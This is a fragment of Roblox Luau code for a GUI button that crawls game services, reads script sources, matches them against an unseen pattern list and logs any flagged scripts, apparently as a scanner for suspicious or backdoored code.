local suspiciousModules = {}

btnModScan.MouseButton1Click:Connect(function()
    for _, c in ipairs(modLog:GetChildren()) do if c:IsA("TextLabel") then c:Destroy() end end
    suspiciousModules = {}
    writeModLog("Scanning script sources across all replicating services...", Color3.fromRGB(200,200,200))
    
    local scanned, flagged = 0, 0
    task.spawn(function()
        for _, zone in ipairs(getZones()) do
            pcall(function()
                local function crawl(node)
                    local ok, ch = pcall(node.GetChildren, node)
                    if not ok or not ch then return end
                    for _, obj in ipairs(ch) do
                        local isScript = obj:IsA("ModuleScript") or obj:IsA("LocalScript") or obj:IsA("Script")
                        if isScript then
                            scanned = scanned + 1
                            local srcOk, src = pcall(function() return obj.Source end)
                            if srcOk and type(src)=="string" and #src > 3 then
                                local hits = {}
                                for _, pat in ipairs(SOURCE_PATTERNS) do
                                    if src:find(pat[1]) then table.insert(hits, pat[2]) end
                                end
                                if #hits > 0 then
                                    flagged = flagged + 1
                                    if obj:IsA("ModuleScript") then
                                        table.insert(suspiciousModules, obj)
                                    end
                                    local path = obj:GetFullName()
                                    if #path > 60 then path = "..." .. path:sub(-57) end
                                    writeModLog("[" .. obj.ClassName .. "] " .. path, Color3.fromRGB(255,130,50))
                                    writeModLog("  >> " .. table.concat(hits, ", "), Color3.fromRGB(220,220,100))
                                end
                            end
                            task.wait()
                        end
                        crawl(obj)
                    end
                end
                crawl(zone)
            end)
        end
        writeModLog(("Scan complete: %d scripts scanned, %d flagged."):format(scanned,flagged), Color3.fromRGB(100,255,100))
        if flagged == 0 then
            writeModLog("No suspicious scripts found in visible scope.", Color3.fromRGB(150,150,150))
        end
    end)
end)

